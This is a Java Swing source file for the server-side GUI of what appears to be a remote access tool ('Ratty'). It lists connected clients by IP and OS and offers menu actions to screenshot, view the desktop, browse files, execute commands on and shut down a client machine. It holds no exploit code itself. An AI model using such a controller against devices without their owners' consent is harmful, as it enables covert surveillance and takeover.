package de.sogomn.rat.server.gui;

import java.awt.Graphics2D;
import java.awt.Point;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;

import javax.swing.ImageIcon;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.table.DefaultTableModel;

import de.sogomn.engine.Screen;
import de.sogomn.engine.fx.SpriteSheet;
import de.sogomn.engine.util.ImageUtils;

public final class RattyGui {
	
	private JFrame frame;
	
	private JTable table;
	private DefaultTableModel tableModel;
	private long lastIdClicked;
	
	private JPopupMenu menu;
	
	private Screen screen;
	private BufferedImage image;
	
	private IGuiController controller;
	
	private static final String[] HEADERS = {
		"ID",
		"Name",
		"IP address",
		"OS",
		"Version"
	};
	private static final int SCREEN_WIDTH = 800;
	private static final int SCREEN_HEIGHT = 600;
	private static final BufferedImage ICON = ImageUtils.scaleImage(ImageUtils.loadImage("/gui_icon.png"), 64, 64);
	private static final BufferedImage[] MENU_ICONS = new SpriteSheet("/icons.png", 16, 16).getSprites();
	
	public static final String POPUP = "Open popup";
	public static final String SCREENSHOT = "Take screenshot";
	public static final String DESKTOP = "View desktop";
	public static final String FILES = "Browse files";
	public static final String COMMAND = "Execute command";
	public static final String SHUTDOWN = "Shutdown device";
	public static final String FREE = "Free client";
	public static final String[] ACTION_COMMANDS = {
		POPUP,
		SCREENSHOT,
		DESKTOP,
		FILES,
		COMMAND,
		SHUTDOWN,
		FREE
	};
	
	public RattyGui() {
		frame = new JFrame();
		table = new JTable();
		tableModel = (DefaultTableModel)table.getModel();
		menu = new JPopupMenu();
		
		for (int i = 0; i < ACTION_COMMANDS.length && i < MENU_ICONS.length; i++) {
			final String command = ACTION_COMMANDS[i];
			final JMenuItem item = new JMenuItem(command);
			final ImageIcon icon = new ImageIcon(MENU_ICONS[i]);
			
			item.setActionCommand(command);
			item.addActionListener(this::menuItemClicked);
			item.setIcon(icon);
			
			menu.add(item);
		}
		
		final MouseAdapter mouseAdapter = new MouseAdapter() {
			@Override
			public void mousePressed(final MouseEvent m) {
				final Point mousePoint = m.getPoint();
				final int row = table.rowAtPoint(mousePoint);
				
				lastIdClicked = (Long)tableModel.getValueAt(row, 0);
			}
		};
		
		tableModel.setColumnIdentifiers(HEADERS);
		table.setEnabled(false);
		table.setComponentPopupMenu(menu);
		table.addMouseListener(mouseAdapter);
		
		final JScrollPane scrollPane = new JScrollPane(table, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		
		scrollPane.setBorder(null);
		
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setContentPane(scrollPane);
		frame.pack();
		frame.setLocationByPlatform(true);
		frame.setIconImage(ICON);
		frame.setVisible(true);
		frame.requestFocus();
	}
	
	private void menuItemClicked(final ActionEvent a) {
		if (controller == null) {
			return;
		}
		
		final String command = a.getActionCommand();
		
		controller.userInput(command);
	}
	
	private void drawImage(final Graphics2D g) {
		g.drawImage(image, 0, 0, null);
	}
	
	public void addRow(final long id, final String name, final String address, final String os, final String version) {
		final Object[] data = {id, name, address, os, version};
		
		tableModel.addRow(data);
	}
	
	public void removeRow(final long id) {
		final int rows = tableModel.getRowCount();
		
		for (int i = 0; i < rows; i++) {
			final long rowId = (Long)tableModel.getValueAt(i, 0);
			
			if (rowId == id) {
				tableModel.removeRow(i);
				
				return;
			}
		}
	}
	
	public void showImage(final BufferedImage image) {
		this.image = image;
		
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		if (screen == null || screen.getInitialWidth() != width || screen.getInitialHeight() != height) {
			screen = new Screen(width, height);
			screen.addListener(this::drawImage);
			screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
		}
		
		screen.show();
		screen.redraw();
	}
	
	public void setController(final IGuiController controller) {
		this.controller = controller;
	}
	
	public long getLastIdClicked() {
		return lastIdClicked;
	}
	
	public static void showMessage(final String message) {
		final JOptionPane optionPane = new JOptionPane(message);
		final JDialog dialog = optionPane.createDialog(null);
		
		dialog.setModal(false);
		dialog.setVisible(true);
	}
	
	public static String getInput() {
		final String input = JOptionPane.showInputDialog(null);
		
		return input;
	}
	
}
